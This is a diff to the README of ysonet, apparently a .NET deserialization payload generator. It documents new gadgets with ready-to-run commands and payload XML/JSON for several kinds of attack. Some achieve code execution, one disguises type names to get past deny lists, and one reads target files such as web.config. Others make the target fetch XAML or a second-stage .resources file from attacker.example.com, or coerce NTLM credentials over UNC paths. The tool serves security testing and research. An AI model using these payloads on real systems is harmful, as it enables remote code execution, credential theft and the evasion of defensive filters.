@@ -399,6 +399,131 @@ of shipping a payload that quietly delivers something else. BinaryFormatter and
 LosFormatter carry the strings unchanged, so `--minify` works with them for any
 input.
 
+### Choose which ClaimsIdentity member carries a nested BinaryFormatter payload
+
+`ClaimsIdentity.Deserialize` runs an unbindered `BinaryFormatter` on three
+`SerializationInfo` names, and `WindowsIdentity` (mscorlib, built in) is the type
+that reaches it. All three have the same effect, so `--variant` is there for a
+target that filters, schemas, or logs on the member NAME.
+
+```bash
+# 1 (default) System.Security.ClaimsIdentity.actor - the shortest, unchanged
+./ysonet.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe"
+
+# 2 System.Security.ClaimsIdentity.bootstrapContext - the WIF-era name
+./ysonet.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe" --variant 2
+
+# 3 System.Security.ClaimsIdentity.claims - read back as a List<Claim>
+./ysonet.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe" --variant 3
+```
+
+Every variant works on all six advertised formatters, and an unknown number falls
+back to 1.
+
+`WindowsClaimsIdentity` uses the SAME numbers for the same three keys, so the two
+gadgets are learnable together. It adds a fourth: the WIF type's own `_actor`
+member, which is a separate sink inside `Microsoft.IdentityModel` rather than
+mscorlib's `ClaimsIdentity.Deserialize`. That form has to carry an `IntPtr`
+member, which only BinaryFormatter, LosFormatter and NetDataContractSerializer can
+express, so `--variant 4` is refused by name on the other three rather than
+quietly building a different member. The whole gadget needs
+`Microsoft.IdentityModel`, which is not in the GAC.
+
+> Numbering change: `WindowsClaimsIdentity`'s variant numbers used to mean
+> different members depending on `-f`. On BinaryFormatter, LosFormatter and
+> NetDataContractSerializer, variant 1 was the WIF `_actor` form and 2/3 were
+> `.actor`/`.bootstrapContext`; on the other three, 1 was `.actor`, 2 was
+> `.bootstrapContext` and 3 silently fell through to 1. Every combination fired,
+> so nothing ever failed. If you scripted a variant number against this gadget,
+> re-check it: the WIF `_actor` form is now `--variant 4` everywhere it exists,
+> and 1/2/3 are `.actor`/`.bootstrapContext`/`.claims` on every formatter.
+> `WindowsIdentity` is unaffected.
+
+One thing to watch when chaining: `--bgc` hands the SAME options to every gadget
+in the chain, so `--variant` reaches the bridged gadget too. If that gadget does
+not know the number, it refuses the chain and names itself in the error.
+
+### Get the DataTable carrier past a type-name filter
+
+`DataTableTypeSpoof` builds exactly the payload `DataTable` builds and writes a
+different TYPE NAME on the wire: the name of a real SUBCLASS of
+`System.Data.DataTable`. A subclass inherits the protected
+`DataTable(SerializationInfo, StreamingContext)` constructor, and that constructor
+is what rebuilds the rows, so a target that only rejects the base name by string
+still builds the carrier and fires the inner gadget.
+
+```bash
+# the default in-box profile: System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection
+./ysonet.exe -g DataTableTypeSpoof -f BinaryFormatter -c "calc.exe"
+
+# the second in-box profile, one flag away (same assembly)
+./ysonet.exe -g DataTableTypeSpoof -f SoapFormatter -c "calc.exe" \
+    --target-type "System.Data.Entity.Design.SsdlGenerator.RelationshipDetailsCollection"
+
+# a typed-DataSet table from the target's own assembly - both strings go on the wire
+# verbatim; a nested type uses '+', so OrdersDataSet.OrdersDataTable is written like this:
+./ysonet.exe -g DataTableTypeSpoof -f LosFormatter -c "calc.exe" \
+    --target-type "Contoso.Data.OrdersDataSet+OrdersDataTable" \
+    --target-assembly "Contoso.Data, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"
+```
+
+What actually goes in the two fields, measured on .NET Framework 4.8.1 (fires = the
+payload deserialized and ran):
+
+| `--target-type` | `--target-assembly` | BinaryFormatter | SoapFormatter |
+|---|---|---|---|
+| `...SsdlGenerator.TableDetailsCollection` (default) | full identity | fires | fires |
+| `...SsdlGenerator.RelationshipDetailsCollection` | full identity | fires | fires |
+| `System.Data.DataTable` | `System.Data` full identity | fires | fires |
+| a typed-DataSet table subclass on the target | that app's assembly | fires | fires |
+| a real subclass | partial name or wrong `Version=` | fires | no |
+| a type that is not `[Serializable]` | resolvable assembly | no | no |
+| any type | an assembly not on the target | no | no |
+
+Three rules explain the table:
+
+- THE ASSEMBLY MUST EXIST ON THE TARGET. ysonet never loads it - only names travel
+  on the wire - but the target does, and a name it cannot resolve binds to nothing.
+- THE TYPE MUST BE `[Serializable]`. A type that resolves but is not (say
+  `SqlConnection`) is rejected before anything is built.
+- SOAP IS STRICT, BINARYFORMATTER IS LENIENT ON THE ASSEMBLY NAME. SoapFormatter
+  needs the full, correct assembly identity to resolve; a partial name or wrong
+  version silently produces nothing. BinaryFormatter falls back to a partial load.
+  Use the full identity always - it is what the default ships.
+
+The best real-world names are TYPED DATASET tables: every `.xsd`-generated table
+class derives from `TypedTableBase<T>` -> `DataTable` and is `[Serializable]`, so an
+application built on typed DataSets has one per table. They are NESTED types, so the
+wire name uses `+`: `MyApp.Data.OrdersDataSet+OrdersDataTable`.
+
+Three things to know:
+
+- WHEN THIS HELPS. A deny list, a naive `SerializationBinder`, or a signature that
+  matches `System.Data.DataTable` in the bytes. It does nothing against an
+  ALLOWLIST, and nothing against a target that does not deserialize a DataTable at
+  all. This is the same idea watchTowr used for CVE-2025-23120 in Veeam Backup &
+  Replication, where the application's own `DataSet` subclasses walked through a
+  deny list that named only the base type.
+- IT IS NOT THE `DataSetTypeSpoof` TRICK. That one appends `, x=]` to a real type
+  name and relies on how a binder parses the string; the type is still
+  `System.Data.DataSet`. Here the name is a type that really exists, and the target
+  resolves it normally.
+- WHAT THE DEFAULT NEEDS. `System.Data.Entity.Design`, which ships with the full
+  .NET Framework (not the Client Profile). If the target does not have it, name a
+  subclass it does have (see the typed-DataSet note above). Nothing you type is
+  validated - only an empty value is refused - because what a name resolves to is
+  the target's decision.
+- TWO HALVES OF THE TECHNIQUE. The name getting past the filter is one half; the
+  target then rebuilding a real `DataTable` from the payload, through the subclass's
+  inherited constructor, is the other. That second half is what matters when the
+  target CASTS the deserialized root to `DataTable`, and it needs a name that
+  resolves to a real `DataTable` subclass - a bogus name gets the inner gadget to
+  fire (it is materialised first) but leaves no usable root object.
+
+`--variant` works exactly as it does on `DataTable`: 1 (default) is the
+`TextFormattingRunProperties` inner, 2 is the built-in `TypeConfuseDelegate` inner,
+which drops SoapFormatter because it is generic.
+
 ### Delete files on the target when the object is disposed or collected
 
 `TempFileCollection` uses `System.CodeDom.Compiler.TempFileCollection`, whose
@@ -429,9 +554,11 @@ Four things to know:
 - Every path is a path on the TARGET. It is not opened, resolved or checked on
   your machine, so a relative path resolves against the deserializing process's
   working directory. Paths that differ only by case are collapsed into one entry.
-- `-t` is refused. A self-test would deserialize the payload here, which builds a
-  real `TempFileCollection` holding YOUR paths and lets its finalizer delete your
-  own files. Generate without `-t`.
+- `-t` is a self-exploit and is genuinely DESTRUCTIVE here. It deserializes the
+  payload on your machine, which builds a real `TempFileCollection` holding YOUR
+  paths and lets its finalizer DELETE your own files. So `-t` only paths you are
+  willing to lose; a `--minify`-rewritten path is refused before `-t` can delete
+  anything.
 
 The same path-fidelity rule as above applies, and a little more strictly: because
 this gadget deletes what it names, ysonet checks every payload it produces and
@@ -487,6 +614,262 @@ The path is the whole payload, so ysonet checks that the payload it emitted stil
 carries your path exactly and refuses rather than shipping one the XML minifier
 rewrote (see the minification note above). `--rawinput` hands both the escaping
 and that check to you.
+
+### Make the target fetch and load remote WPF markup
+
+`ResourceDictionary` uses `System.Windows.ResourceDictionary.Source`, a `Uri`
+property whose SETTER does the work: it opens a `WebRequest` for whatever you put
+in `-c` and then hands the response to the WPF markup loader. That is two effects
+from one very short document, and which one you get depends only on what you
+point it at.
+
+```bash
+# the target fetches your XAML and LOADS it, so whatever the document declares is built
+./ysonet.exe -g ResourceDictionary -f Xaml -c "http://attacker.example.com/x.xaml"
+
+# no hosted content needed: opening the SMB session IS the effect
+./ysonet.exe -g ResourceDictionary -f Xaml -c "\\attacker.example.com\share\x"
+
+# a path on the target works too - nothing here is resolved on your machine
+./ysonet.exe -g ResourceDictionary -f Xaml -c "C:\ProgramData\x.xaml"
+```
+
+The whole payload is one element:
+
+```xml
+<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" Source="http://attacker.example.com/x.xaml"/>
+```
+
+Four things to know:
+
+- THE FETCH ALWAYS HAPPENS, THE LOAD NEEDS A TYPE WPF MAPS. The request goes out
+  before anything is parsed. What comes back is only turned into objects when WPF
+  has a converter for it - `application/xaml+xml` for XAML, `application/baml+xml`
+  for compiled BAML. But you usually do not have to set that header at all: when
+  the response is labelled `text/plain` or `application/octet-stream` and the URL
+  ends in `.xaml` or `.xbap`, WPF DISCARDS the header and picks the type from the
+  extension, so a plain static file server works as-is. An unmapped type such as
+  `application/x-whatever` does stop it, and you get the callback and nothing more.
+- THE UNC FORM SENDS AUTHENTICATION MATERIAL. Windows authenticates when it opens
+  an SMB session, so a UNC value is a credential-coercion primitive and needs no
+  hosted content at all. Point it only at an endpoint you own.
+- XAML IS THE ONLY FORMATTER, and that is measured, not an oversight.
+  `ResourceDictionary` implements `IDictionary`, so Json.NET, JavaScriptSerializer
+  and YamlDotNet build the object and then file `Source` away as a dictionary KEY
+  without ever calling the setter - no error, no request. `Source` is also typed
+  `Uri`, which FastJson and both SharpSerializer modes cannot construct from a
+  string. The runtime formatters refuse the type outright (it is not
+  `[Serializable]`), and MessagePack Typeless has
+  `System.Windows.ResourceDictionary` on its own hardcoded deny list.
+- `-t` WORKS, and it means what it means everywhere else: the payload is
+  deserialized HERE, so YOUR machine performs the fetch and loads what comes back.
+
+`-c` is taken exactly as you typed it - no scheme check, no host check, no
+extension check - because what resolves is the target's decision. The only two
+refusals are an empty value and one `--minify` would rewrite: the value lives in
+an XML attribute and the XML minifier collapses `"; "`, so ysonet re-reads its own
+emitted document and refuses rather than shipping a payload that quietly fetches
+a different URL. `--rawinput` hands both the escaping and that check to you.
+
+This replaces `ObjectDataProvider --variant 3 --xamlurl`, and the URL is now an
+ordinary `-c`. IF YOU HAVE SCRIPTS: `ObjectDataProvider --var 3` no longer builds
+anything - it now fails with a message pointing here. Its `--var 4` fails the same
+way and points at the new `WorkflowDesigner` gadget below. Neither number is
+reused, so a script that used one gets an error rather than a different payload.
+The `TextFormattingRunProperties --xamlurl` option and the SharePoint plugin's
+`--useurl` mode are unchanged and now carry this gadget's document.
+
+### Read a file, load a `.resources`, or activate a type through ResXFileRef
+
+`ResXFileRef` carries `[TypeConverter(typeof(Converter))]`, and that converter is
+the whole gadget. Given one string - a path, a type name and an optional encoding -
+the deserializing process resolves the type with `Type.GetType` and then OPENS THE
+PATH. What it does with the bytes depends only on the type name, so the gadget has
+three variants and needs no resource file anywhere:
+
+```bash
+# variant 1: the target reads the file and hands the TEXT back as the value
+./ysonet.exe -g ResXFileRef -f Xaml -c "C:\inetpub\wwwroot\web.config" --variant 1
+
+# variant 1 with an encoding, and a UNC path - opening the SMB session coerces auth
+./ysonet.exe -g ResXFileRef -f Xaml -c "\\attacker.example.com\share\web.config" --variant 1 --enc utf-8
+
+# variant 2 (default): the target's ResourceSet reads a .resources file with BinaryFormatter
+./ysonet.exe -g ResXFileRef -f YamlDotNet -c "\\attacker.example.com\share\stage.resources" --variant 2
+
+# variant 3: activate the type you name, with the file's bytes as its Stream argument
+./ysonet.exe -g ResXFileRef -f Xaml -c "\\attacker.example.com\share\blob.bin" --variant 3 --type "System.IO.BufferedStream, mscorlib"
+```
+
+The Xaml payload is one element whose TEXT is the converter value:
+
+```xml
+<ResXFileRef xmlns="clr-namespace:System.Resources;assembly=System.Windows.Forms">\\attacker.example.com\share\stage.resources;System.Resources.ResourceSet, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</ResXFileRef>
+```
+
+Variant 2 is a two-step chain. Build the second-stage `.resources` with the Resx
+plugin, host it on your share, and point `-c` at it:
+
+```bash
+# 1. build a BinaryFormatter .resources that runs a command
+./ysonet.exe -p Resx -m CompiledDotResources -c calc.exe -of stage.resources
+# 2. host stage.resources, then send the ResXFileRef payload from above
+```
+
+Things to know:
+
+- THE TYPE NAME DECIDES THE EFFECT. Variant 3 is a bring-your-own variant: what
+  happens is decided entirely by the type you name (it needs one public instance
+  constructor taking a `Stream`), so it is NOT necessarily code execution and its
+  category is `other`, not `code-execution`.
+- A PATH WITH `;` IS QUOTED FOR YOU, following `ResXFileRef.ToString()`, because the
+  converter reads an unquoted path only up to the first `;`. A path containing `"`
+  cannot be expressed - the framework's own parser cannot express it either.
+- TWO FORMATTERS, and it is structural. Xaml hands an element's initialization text
+  to the converter and YamlDotNet resolves a tagged root scalar and converts it;
+  every other serializer either needs a parameterless constructor and a writable
+  member (it has neither), rebuilds the object from its fields and never runs the
+  converter (a clean round trip that reads nothing), or has nowhere to declare the
+  type. The `RestrictiveXamlXmlReader` used by the WPF clipboard and XPS sinks drops
+  this payload silently.
+- `-t` IS ACCEPTED ON EVERY VARIANT, because in ysonet `-t` is a self-exploit: it
+  deserializes the payload on YOUR machine, so the effect fires on you. Variant 1 reads
+  the file back, variant 2 runs a BinaryFormatter over the `.resources` you point `-c` at,
+  variant 3 activates your named type - all in the ysonet process. Only `-t` a file and a
+  type you trust, because you are running them on yourself.
+
+The Resx plugin reaches the SAME converter through a RESX document, and its
+`indirect_resx_file` mode now takes the same knobs. The default is byte-for-byte
+what it always emitted, so existing commands are unchanged:
+
+```bash
+# unchanged default: names ResXResourceSet, loads the file as a .resources document
+./ysonet.exe -p Resx -m indirect_resx_file -F "\\attacker.example.com\share\stage.resources"
+
+# read the file back instead, in a chosen encoding
+./ysonet.exe -p Resx -m indirect_resx_file -F "\\attacker.example.com\share\web.config" --type "System.String" --enc utf-8
+```
+
+### Smuggle a XAML payload as a plain string
+
+`WorkflowDesigner` uses
+`System.Activities.Presentation.WorkflowDesigner.PropertyInspectorFontAndColorData`,
+a public string property with a SETTER AND NO GETTER whose setter runs
+`XamlReader.Load` on whatever it is given. So the whole payload is one type name
+and one string member, and that string is a XAML document.
+
+```bash
+# the default inner document: a Hashtable holding an ObjectDataProvider that runs -c
+./ysonet.exe -g WorkflowDesigner -f Json.NET -c "calc.exe"
+
+# same technique through a formatter the old ObjectDataProvider wrapper could not reach
+./ysonet.exe -g WorkflowDesigner -f MessagePackTypeless -c "calc.exe" -o base64
+
+# bring your own XAML: any Xaml gadget can be the inner payload
+./ysonet.exe -g WorkflowDesigner -bgc ObjectDataProvider -f Json.NET -c "calc.exe"
+```
+
+The Json.NET form is two lines:
+
+```json
+{
+    "$type":"System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "PropertyInspectorFontAndColorData":"<the XAML document, escaped for this string>"
+}
+```
+
+Four things to know:
+
+- WHY IT REACHES EIGHT FORMATTERS WHEN THE MEMBER CANNOT BE READ. That is the
+  interesting part, and it cuts the other way from what you would expect. A
+  serializer that builds its member list from a read-AND-write contract never sees
+  a write-only property: it resolves the type, constructs it, and assigns nothing.
+  The eight that work either look the member up by name at assignment time or keep
+  a member whose setter exists without a getter. `YamlDotNet` is the one that does
+  not, and it says so rather than failing quietly. The runtime formatters
+  (BinaryFormatter, SoapFormatter, LosFormatter, FsPickler) are out because the
+  type is not `[Serializable]`, and the DataContract family and `XmlSerializer` are
+  out because a POCO contract needs read-write members.
+- IT IS NOT AN XXE PRIMITIVE. The setter builds its `XmlReader` with
+  `XmlResolver = null`, so no DTD or external entity is fetched. What you get is
+  XAML OBJECT CONSTRUCTION, which is why the inner payload is a gadget rather than
+  a URL.
+- THE TARGET NEEDS AN STA THREAD, and `System.Activities.Presentation`. The
+  constructor builds WPF objects and creates a `System.Windows.Application` when
+  the process has none, so a payload that lands on a plain worker thread throws
+  before the member is ever assigned. `-t` handles this for you.
+- THE LOADED ROOT SHOULD BE A `Hashtable`. The setter casts the result of
+  `XamlReader.Load` to one. The cast runs AFTER the document has been built, so a
+  different root still fires and then throws - but the default inner document uses
+  a `Hashtable` root so the setter completes cleanly, and a bridged payload can do
+  the same if you care about that.
+
+This replaces `ObjectDataProvider --variant 4`, which existed only when the outer
+formatter was already Xaml.
+
+### Turn a XAML-only sink into a NetDataContractSerializer sink
+
+`DynamicUpdateMapExtension` is a public `MarkupExtension` in `System.Activities`
+whose content property hands its XML straight to
+`NetDataContractSerializer.ReadObject`, with no binder and no known-type list. So a
+host that only ever parses XAML - `XamlServices.Load`, `ActivityXamlServices.Load`
+for a `.xamlx` workflow file, `WorkflowDesigner.Load(fileName)`,
+`System.Windows.Markup.XamlReader.Load` - can be given any NDCS gadget in this
+tool.
+
+```bash
+# the default inner payload: TypeConfuseDelegate through NetDataContractSerializer
+./ysonet.exe -g DynamicUpdateMapExtension -f Xaml -c "calc.exe"
+
+# bring your own inner chain: any gadget that supports NetDataContractSerializer
+./ysonet.exe -g DynamicUpdateMapExtension -bgc WindowsIdentity -f Xaml -c "calc.exe"
+
+# carry the whole thing through a non-XAML formatter by chaining it as a Xaml inner
+./ysonet.exe -g WorkflowDesigner -bgc DynamicUpdateMapExtension -f Json.NET -c "calc.exe"
+```
+
+The document is short, and its shape is the whole technique:
+
+```xml
+<DynamicUpdateMapExtension xmlns="clr-namespace:System.Activities.XamlIntegration;assembly=System.Activities"
+                           xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
+  <DynamicUpdateMapExtension.XmlContent>
+    <x:XData>
+      <!-- the NetDataContractSerializer document, as literal XML -->
+    </x:XData>
+  </DynamicUpdateMapExtension.XmlContent>
+</DynamicUpdateMapExtension>
+```
+
+Three things to know:
+
+- THE `<x:XData>` WRAPPER IS LOAD BEARING. The XAML scanner treats markup as
+  literal XML only for that one element; the object writer then sees an `XData`
+  value on a member whose type is `IXmlSerializable`, reads the property, and calls
+  `ReadXml` on what it got back. Nest the inner document directly under
+  `<DynamicUpdateMapExtension.XmlContent>` instead and the parser tries to resolve
+  its root as a XAML type, failing with "Cannot create unknown type" without ever
+  reaching the serializer.
+- A FAILED LOAD IS THE NORMAL OUTCOME. `ReadXml` casts the result to
+  `DynamicUpdateMap` AFTER `ReadObject` has returned, so the inner chain has already
+  run by the time you see the `InvalidCastException`. Do not read that error as "the
+  payload did not work".
+- XAML IS THE ONLY FORMATTER, because the sink is a XAML parser feature rather than
+  a member assignment: no other serializer calls `ReadXml`, `XmlContent` has no
+  setter, the type is not `[Serializable]`, and a data contract is built from
+  read-write members. To reach it from another format, chain this gadget INTO a
+  consumer that takes a Xaml inner payload, as in the third example above.
+
+Where it does NOT land: the restrictive XAML reader behind the CVE-2020-0605/0606
+mitigation, which the WPF clipboard and XPS sinks use, drops this payload. Its
+five named types (`ObjectDataProvider`, `ResourceDictionary`, `AssemblyInstaller`,
+`WorkflowDesigner`, `BindingSource`) look like a blocklist, but the check is really
+an ALLOWLIST: it keeps only a `DependencyObject` subclass in the `System.Windows`
+namespaces, a primitive, or a type an administrator allowed in the registry, and
+silently skips every other subtree - no exception, nothing built, no effect. That
+is a property of that one reader; `XamlServices.Load` and
+`ActivityXamlServices.Load`, which is where this gadget is aimed, use the default
+schema context and are unaffected.
 
 ### Make the target call out over DCOM/RPC
 
@@ -709,9 +1092,10 @@ public class Boom : Installer
 
 Things to know:
 
-- `-t` IS REFUSED, on purpose. A self-test deserializes the payload in the ysonet
-  process, which would load your DLL and run its installer constructors on YOUR
-  machine. Generate without `-t` and deliver the payload to the target.
+- `-t` IS A SELF-EXPLOIT and is accepted: it deserializes the payload in the ysonet
+  process, which loads your DLL and runs its installer constructors on YOUR machine
+  - the same self-run `-t` performs for every other gadget. Only `-t` a DLL you
+  trust; to hit the target instead, generate and deliver the payload.
 - Without a `[RunInstaller(true)]` installer class, the payload is only an assembly
   load. That is still useful (a module initializer or a static constructor may run),
   but it is not the same thing.
